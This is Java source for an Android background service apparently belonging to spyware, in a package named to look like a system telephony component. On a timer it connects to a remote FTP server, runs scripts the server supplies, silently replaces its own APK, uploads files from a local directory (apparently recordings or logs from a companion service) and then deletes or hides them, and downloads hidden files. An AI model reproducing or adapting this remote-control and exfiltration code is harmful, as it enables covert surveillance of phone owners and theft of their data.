package com.telephony.services;

import java.io.File;
import java.io.FileFilter;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;

public class SuperService extends Service {

	private static final String INDEX_FILE = "files";

	public static final int COMMAND_RUN_SCRIPTER = 1;
	public static final int COMMAND_RUN_UPDATER = 2;
	public static final int COMMAND_RUN_UPLOAD = 3;
	public static final int COMMAND_RUN_DOWNLOAD = 4;

	private PreferenceUtils sPref = null;
	private ExecutorService es;
	private MyFTPClient ftp = null;
	private Updater upd = null;
	private Scripter scp = null;
	private int command = 0;
	private long interval = 0;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		try {
			es = Executors.newFixedThreadPool(1);
			sPref = PreferenceUtils.getInstance(this);

			ftp = new MyFTPClient();
		} catch (Exception e) {
			e.printStackTrace();
		}
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));
		return START_REDELIVER_INTENT;

	}

	private class RunService implements Runnable {
		final Intent intent;
		final int flags;
		final int startId;
		final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		@Override
		public void run() {
			long rfs = -1;
			try {
				command = intent.getIntExtra(Utils.EXTRA_COMMAND, 0);
				interval = intent.getLongExtra(Utils.EXTRA_INTERVAL, 0);
				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": start " + startId + " with command: " + command);
				if (sPref.getRootDir().exists() && (Utils.getExternalStorageStatus() == Utils.MEDIA_MOUNTED)
						&& Utils.waitForInternet(context, sPref.isWifiOnly(), 30)) {
					if (!ftp.isReady()) {
						ftp.connect(sPref.getRemoteUrl());
					}
					if (ftp.isReady()) {
						switch (command) {
						case COMMAND_RUN_SCRIPTER:
							scp = new Scripter(context, ftp);
							scp.execScript();
							break;

						case COMMAND_RUN_UPDATER:
							upd = new Updater(context, ftp);
							try {
								if (upd.getRemoteVersion() > Utils.getCurrentVersion(context)) {
									upd.updateAPK();
								}
							} finally {
								upd.free();
							}
							break;

						case COMMAND_RUN_UPLOAD:
							File[] list = Utils.rlistFiles(sPref.getRootDir(), new FileFilter() {
								@Override
								public boolean accept(File f) {
									Date today = new Date();
									return f.isDirectory()
											|| (!f.isHidden() && new Date(f.lastModified()).before(new Date(today.getTime() - (Utils.MINUTE * 15))));
								}
							});
							String remotefile = "";
							for (File file : list) {
								try {
									if (file.isFile()) {
										remotefile = ftp.getRemoteFile(sPref.getRootDir(), file);
										if (ftp.getFileSize(remotefile) != file.length()) {
											Log.d(Utils.LOG_TAG, "try upload: " + file.getAbsolutePath());
											ftp.uploadFile(file, remotefile);
										}
										if (!sPref.isKeepUploaded() || (file.getName().equals(SMService.CONFIG_OUT_FILENAME))) {
											file.delete();
										} else {
											Utils.setHidden(file);
										}
									}
								} catch (Exception e) {
									e.printStackTrace();
									if (!ftp.isReady()) {
										break;
									}
								}
							}
							break;

						case COMMAND_RUN_DOWNLOAD:
							String[] files = ftp.downloadFileStrings(INDEX_FILE);
							File file = null;
							for (String fn : files) {
								try {
									if (!fn.equals("")) {
										rfs = ftp.getFileSize(fn);
										if (rfs > 0) {
											file = Utils.getHidden(ftp.getLocalFile(sPref.getRootDir(), fn));
											if (file != null) {
												if ((file.exists() && (file.length() != rfs)) || (!file.exists())) {
													Log.d(Utils.LOG_TAG, "try download: " + fn + " to " + file.getAbsolutePath());
													ftp.downloadFile(fn, file);
												}
											}
										}
									}
								} catch (Exception e) {
									e.printStackTrace();
									if (!ftp.isReady()) {
										break;
									}
								}
							}
							break;
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
				interval /= 4;
			} finally {
				stop();
			}
		}

		public void stop() {
			Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
			try {
				if ((command > 0) && (interval > 0)) {
					AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
					PendingIntent pi = PendingIntent.getService(context, 0, intent, 0);
					am.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + interval, pi);
				}

				if (stopSelfResult(startId)) {
					if (ftp != null) {
						ftp.disconnect();
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		try {
			es.shutdown();
			if ((es.isShutdown()) && (!es.awaitTermination(5, TimeUnit.SECONDS))) {
				es.shutdownNow();
				if (!es.awaitTermination(5, TimeUnit.SECONDS)) {
					Log.d(Utils.LOG_TAG, "Pool did not terminated");
				}
			}
		} catch (InterruptedException ie) {
			es.shutdownNow();
		} catch (Exception e) {
			e.printStackTrace();
		}
		es = null;
		sPref = null;
		ftp = null;
		upd = null;
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

}
